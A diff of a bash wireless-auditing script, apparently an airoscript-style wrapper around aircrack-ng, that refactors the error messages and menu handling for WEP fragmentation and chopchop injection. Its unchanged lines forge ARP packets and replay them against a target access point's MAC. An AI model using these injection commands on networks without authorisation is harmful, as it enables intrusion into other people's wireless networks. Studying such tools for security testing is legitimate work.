@@ -21,7 +21,7 @@ injectmenu(){
     $clear
     while true; do
         ls -lah $DUMP_PATH/fragment-*.xor &>/dev/null
-        [[ $? != 0 ]] && { echo -n "$mark";  _ "Can't open fragmentation xor files. Returning"; echo;  return; }
+        [[ $? != 0 ]] && { warn  "$mark Can't open fragmentation xor files. Returning"; echo;  return; }
         if [ "$1" == "frag" ]; then
             if [ "$AUTO" == 1 ]; then
                 if [ "$Client_MAC" != "" ]; then fragend $Client_MAC; return; fi
@@ -30,7 +30,7 @@ injectmenu(){
             fi
 
             mkmenu "Frag Injection" "Frag with client injection"   "Return to main menu"
-            read yn; case $yn in
+            case $choice in
                 1 ) fragend $Client_MAC ; break ;;
                 2 ) fragend $FAKE_MAC; break ;;
                 * ) $clear; break;;
@@ -44,7 +44,7 @@ injectmenu(){
             fi
 
             mkmenu "Chopchop injection" "Chopchop with client inj."  "Return to main menu"
-            read yn; case $yn in
+            case $choice in
                 1 ) chopchopend $FAKE_MAC ; break ;;
                 2 ) chopchopend $CLIENT_MAC ; break ;;
                * ) $clear; break;;
@@ -55,7 +55,7 @@ injectmenu(){
 
 fragend(){
     if [ "$Host_MAC" = "" ]; then
-        $clear && echo -n $mark;  _ 'ERROR: You must select a target first'
+        $clear && warn "$mark ERROR: You must select a target first"
     else
         $ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
         execute "Fragmentation without client" $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $1 -x $INJECTRATE $iwifi 
@@ -64,7 +64,7 @@ fragend(){
 
 chopchopend(){
     if [ "$Host_MAC" = "" ]; then
-        $clear && echo -n $mark ; _ 'ERROR: You must select a target first'
+        $clear && warn "$mark ERROR: You must select a target first"
     else
         $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
         rm -rf $DUMP_PATH/chopchop_$Host_MAC*
